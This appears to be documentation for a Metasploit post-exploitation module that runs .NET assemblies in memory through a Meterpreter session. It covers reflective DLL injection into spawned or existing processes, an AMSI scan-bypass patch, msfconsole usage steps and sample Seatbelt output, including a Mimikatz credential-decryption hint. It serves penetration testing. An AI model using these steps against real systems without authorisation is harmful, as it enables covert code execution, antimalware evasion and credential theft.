# Execute .Net assembly via Meterpreter session

This module to executing a .NET Assembly from Meterpreter session

It spawn a process (or use an existing process providing pid) and use Reflective dll injection to load HostingCLRx64.dll/HostingCLRWin32.dll needed to run .Net assembly
The unmanaged injected dll takes care of verifying if the process has already loaded the clr, and loads it if necessary. The version of the CLR to be loaded is determined by executing the parsing of the assembly provided searching for a known signature. Then run the assembly from memory.
Before loading the assembly in the context of the clr, Amsi is bypassed using the AmsyScanBuffer patching technique (https://rastamouse.me/2018/10/amsiscanbuffer-bypass-part-1/)

You'll find details at [Execute assembly via Meterpreter session](https://b4rtik.blogspot.com/2018/12/execute-assembly-via-meterpreter-session.html)

## Verification Steps

  Example 1 no PID specified:

  1. Start Clone from github SeatBelt or other .Net progect
  2. Buid project with target framework 4.x or 3.5
  2. Start msfconsole
  4. Do: ```use post/windows/manage/execute_assembly```
  5. Do: ```set SESSION sessionid```
  6. Do: ```set ASSEMBLYPATH /your/output/forder```
  7. Do: ```set ASSEMBLY SeatBelt.exe```
  8. Do: ```set ARGUMENTS user```
  9. Do: ```run```
  10. You should get something like that follow

```
msf5 post(windows/manage/execute_assembly) > run

[*] Launching notepad.exe to host CLR...
[+] Process 10628 launched.
[*] Reflectively injecting the Host DLL into 10628..
[*] Injecting Host into 10628...
[*] Host injected. Copy assembly into 10628...
[*] Assembly copied.
[*] Executing...
[*] Start reading output
[+] 
[+] 
[+]                         %&&@@@&&                                                                                  
[+]                         &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%                         
[+]                         &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
[+] %%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
[+] #%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
[+] #%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
[+] #####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
[+] #######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
[+] ###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
[+] #####%######################  %%%..                       @////(((&%%%%%%%################                        
[+]                         &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*                         
[+]                         &%%&&&%%%%%        v0.2.0         ,(((&%%%%%%%%%%%%%%%%%,                                 
[+]                          #%%%%##,                                                                                 
.........
.........
.........
[+]   [*] Use the Mimikatz "dpapi::cred" module with appropriate /masterkey to decrypt
[+] 
[+] 
[+] === Checking for RDCMan Settings Files (Current User) ===
[+] 
[+] 
[+] 
[+] [*] Completed Safety Checks in 11 seconds
[+] 
[*] End output.
[+] Killing process 10628
[+] Execution finished.
[*] Post module execution completed
msf5 post(windows/manage/execute_assembly) >
```

  Example 2 PID specified:

  1. Start Clone from github SeatBelt or other .Net progect
  2. Buid project with target framework 4.x or 3.5
  2. Start msfconsole
  4. Do: ```use post/windows/manage/execute_assembly```
  5. Do: ```set SESSION sessionid```
  6. Do: ```set PID 8648```
  7. Do: ```set ASSEMBLYPATH /your/output/forder```
  8. Do: ```set ASSEMBLY SeatBelt.exe```
  9. Do: ```set ARGUMENTS user```
  10. Do: ```run```
  11. You should get something like that follow

```
msf5 post(windows/manage/execute_assembly) > run

[*] Warning: output unavailable
[*] Hooking 8648 to host CLR...
[+] Process 8648 hooked.
[*] Reflectively injecting the Host DLL into 8648..
[*] Injecting Host into 8648...
[*] Host injected. Copy assembly into 8648...
[*] Assembly copied.
[*] Executing...
[+] Execution finished.
[*] Post module execution completed
msf5 post(windows/manage/execute_assembly) >
```
## Options

```
Module options (post/windows/manage/execute_assembly):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   AMSIBYPASS    true             yes       Enable Amsi bypass
   ARGUMENTS                      no        Command line arguments
   ASSEMBLY                       yes       Assembly file name
   ASSEMBLYPATH                   no        Assembly directory
   PID           0                no        Pid  to inject
   PROCESS       notepad.exe      no        Process to spawn
   SESSION                        yes       The session to run this module on.
   WAIT          10               no        Time in seconds to wait

```

AMSIBYPASS

Enable or Disable Amsi bypass. This parameter is necessary due to the technique used. It is possible that subsequent updates will make the bypass unstable which could result in a crash. By setting the parameter to false the module continues to work.

ARGUMENTS

Command line arguments. The signature of the Main method must match with the parameters that have been set in the module, for example:

If the property ARGUMENTS is set to "antani sblinda destra" the main method should be "static void main (string [] args)"<br />
If the property ARGUMENTS is set to "" the main method should be "static void main ()"

ASSEMBLY 

Assembly file name. This will be searched in ASSEMBLYPATH

ASSEMBLYPATH

Assembly directory where to serach ASSEMBLY

PID

Pid to inject. If different from 0 the module does not create a new process but uses the existing process identified by the PID parameter.

PROCESS

Process to spawn when PID is equal to 0.

SESSION

The session to run this module on. Must be meterpreter session

WAIT

Time in seconds to wait before starting to read the output.

